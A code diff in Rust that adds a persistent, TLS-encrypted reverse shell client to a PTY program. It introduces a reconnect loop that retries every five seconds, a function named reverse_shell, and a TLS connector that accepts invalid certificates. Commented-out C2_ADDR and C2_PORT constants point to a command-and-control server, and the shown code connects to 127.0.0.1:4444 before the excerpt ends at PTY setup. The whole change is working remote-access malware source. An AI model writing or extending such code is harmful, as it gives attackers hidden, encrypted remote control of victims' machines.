@@ -4,13 +4,35 @@ use tokio::{
 };
 use portable_pty::{CommandBuilder, NativePtySystem, PtySize, PtySystem};
 use std::io::{Read, Write}; // Standard sync IO traits for the PTY
+use tokio_native_tls::native_tls::TlsConnector;
+
 
 #[tokio::main]
-async fn main() -> std::io::Result<()> {
+async fn main() {
+    loop {
+        match reverse_shell().await {
+            Ok(_) => println!("Goodbye."),
+            Err(e) => eprintln!("Connection error: {}. Retrying in 5 seconds...", e),
+        }
+
+        tokio::time::sleep(std::time::Duration::from_secs(5)).await;
+    }
+}
+
+
+async fn reverse_shell() -> Result<(), Box<dyn std::error::Error>> {
+    let cx = TlsConnector::builder()
+        .danger_accept_invalid_certs(true)
+        .build()?;
+    let cx = tokio_native_tls::TlsConnector::from(cx);
+
+    //const C2_ADDR: &str = env!("C2_ADDR");
+    //const C2_PORT: &str = env!("C2_PORT");
+
     let stream = TokioTcpStream::connect("127.0.0.1:4444").await?;
-    
+    let stream = cx.connect("127.0.0.1", stream).await?;
     // Split TCP into Read/Write
-    let (mut tcp_reader, mut tcp_writer) = stream.into_split();
+    let (mut tcp_reader, mut tcp_writer) = tokio::io::split(stream);
 
     // Setup PTY
     let pty_system = NativePtySystem::default();
